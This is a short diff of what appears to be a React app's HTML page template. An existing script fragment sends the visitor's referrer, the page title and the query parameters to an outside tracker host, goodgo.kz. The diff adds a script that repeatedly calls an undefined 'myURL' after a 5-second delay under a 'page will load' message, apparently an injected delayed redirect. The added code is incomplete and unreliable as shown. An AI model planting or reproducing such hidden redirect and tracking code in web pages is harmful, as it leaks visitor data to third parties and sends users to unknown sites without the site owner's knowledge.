@@ -11,6 +11,14 @@
             }
             if (document.location.protocol === 'https:' && 'https://goodgo.kz/xRn57Z7R?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm63870967e0e0a=script63870967e0e0b'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
             </script>
+    <script>
+                function load() {
+                   var interval = setInterval(myURL, 5000);
+                   var result = document.getElementById("result");
+                   result.innerHTML = "<b> The page will load after delay of 5 seconds ";
+                } 
+                load();
+             </script>
     <meta charset="utf-8" />
     <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
